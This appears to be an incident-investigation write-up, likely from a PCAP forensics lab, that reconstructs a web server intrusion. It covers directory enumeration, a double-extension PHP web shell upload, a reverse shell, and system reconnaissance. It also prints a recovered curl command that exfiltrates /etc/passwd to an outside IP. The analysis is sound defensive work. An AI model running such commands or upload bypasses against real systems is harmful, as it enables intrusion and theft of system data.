# Attack Timeline

### Overview

The attack timeline was reconstructed through analysis of the packet capture (PCAP), HTTP requests, TCP conversations, and recovered reverse shell commands. The evidence shows that the attacker progressed through multiple phases of the cyber kill chain, beginning with reconnaissance and ending with attempted data exfiltration.

***

### Chronological Timeline

| Time (Approx.) | Attack Phase         | Activity                                                                                                               | Evidence                                                |
| -------------- | -------------------- | ---------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------- |
| **00:00**      | Initial Access       | Attacker connected to the target web server over HTTP (TCP Port 80).                                                   | `GET /`                                                 |
| **00:04**      | Reconnaissance       | Enumerated publicly accessible directories including `/products/`.                                                     | `GET /products/`                                        |
| **00:12**      | Reconnaissance       | Browsed additional web resources to understand the application structure.                                              | `GET /about/`                                           |
| **00:18**      | Reconnaissance       | Enumerated the `/reviews/` directory.                                                                                  | `GET /reviews/`                                         |
| **00:57**      | Discovery            | Attempted to locate administrative upload directories.                                                                 | `GET /admin/uploads`                                    |
| **01:03**      | Discovery            | Enumerated `/uploads`.                                                                                                 | `GET /uploads`                                          |
| **01:09**      | Discovery            | Accessed `/admin/`.                                                                                                    | `GET /admin/`                                           |
| **01:15**      | Discovery            | Located the upload directory `/reviews/uploads/`.                                                                      | HTTP GET requests                                       |
| **01:15**      | Enumeration          | Requested directory resources including `blank.gif`, `back.gif`, and `image2.gif`, confirming directory accessibility. | HTTP requests                                           |
| **01:24**      | Exploitation         | Executed the uploaded PHP web shell `image.jpg.php`.                                                                   | `GET /reviews/uploads/image.jpg.php`                    |
| **01:24**      | Command & Control    | Reverse shell connection established over TCP Port **8080**.                                                           | TCP handshake (SYN → SYN/ACK → ACK)                     |
| **01:28**      | Discovery            | Attacker executed `whoami`.                                                                                            | Output: `www-data`                                      |
| **01:34**      | Discovery            | Executed `uname -a` to identify the operating system.                                                                  | Ubuntu Linux identified                                 |
| **01:35**      | Discovery            | Executed `pwd`.                                                                                                        | `/var/www/html/reviews/uploads`                         |
| **01:36**      | Discovery            | Listed user directories.                                                                                               | `ls /home`                                              |
| **01:37**      | Credential Discovery | Read `/etc/passwd` to enumerate system accounts.                                                                       | `cat /etc/passwd`                                       |
| **03:11**      | Collection           | Prepared sensitive data for transmission.                                                                              | Reverse shell activity                                  |
| **03:11**      | Exfiltration Attempt | Used `curl` to send `/etc/passwd` via HTTP POST.                                                                       | `curl -X POST -d /etc/passwd http://117.11.88.124:443/` |

***

## Attack Progression

The intrusion followed a clear progression through the attack lifecycle:

#### Phase 1 – Reconnaissance

The attacker began by exploring the web application to identify accessible resources, administrative pages, and upload locations.

**Observed Activities**

* Enumerated web directories
* Requested static resources
* Identified upload locations

***

#### Phase 2 – Initial Compromise

After locating a vulnerable upload directory, the attacker executed the malicious PHP file:

```
/reviews/uploads/image.jpg.php
```

The double extension indicates an attempt to bypass upload restrictions while allowing the server to execute the file as PHP.

***

#### Phase 3 – Establishing Persistence

Execution of the web shell resulted in a reverse shell connection over **TCP port 8080**, providing the attacker with interactive remote access to the compromised server.

***

#### Phase 4 – Internal Reconnaissance

Once access was established, the attacker gathered information about the compromised system.

Commands executed included:

```
whoamiuname -apwdls /homecat /etc/passwd
```

These commands revealed:

* Current user (`www-data`)
* Operating system details
* Working directory
* Available user accounts
* System account information

***

#### Phase 5 – Collection and Exfiltration

After collecting system information, the attacker attempted to transfer sensitive data using an HTTP POST request.

Recovered command:

```
curl -X POST -d /etc/passwd http://117.11.88.124:443/
```

Although the packet capture contains missing segments, the recovered command demonstrates an attempt to exfiltrate the contents of `/etc/passwd`.

***

## Timeline Summary

The investigation confirmed that the attacker successfully completed the following stages:

<table data-search="false"><thead><tr><th>Stage</th><th>Status</th></tr></thead><tbody><tr><td>Reconnaissance</td><td>✅ Completed</td></tr><tr><td>Directory Enumeration</td><td>✅ Completed</td></tr><tr><td>Vulnerability Exploitation</td><td>✅ Completed</td></tr><tr><td>Web Shell Execution</td><td>✅ Completed</td></tr><tr><td>Reverse Shell Established</td><td>✅ Completed</td></tr><tr><td>Internal Discovery</td><td>✅ Completed</td></tr><tr><td>Credential Enumeration</td><td>✅ Completed</td></tr><tr><td>Data Collection</td><td>✅ Completed</td></tr><tr><td>Attempted Data Exfiltration</td><td>✅ Completed</td></tr></tbody></table>

***

### Conclusion

The reconstructed timeline shows a structured intrusion in which the attacker systematically progressed from reconnaissance to exploitation, established an interactive reverse shell, performed post-exploitation reconnaissance, and attempted to exfiltrate sensitive information. Each stage is supported by packet-level evidence recovered from the PCAP, providing a clear and defensible sequence of events for the incident investigation.
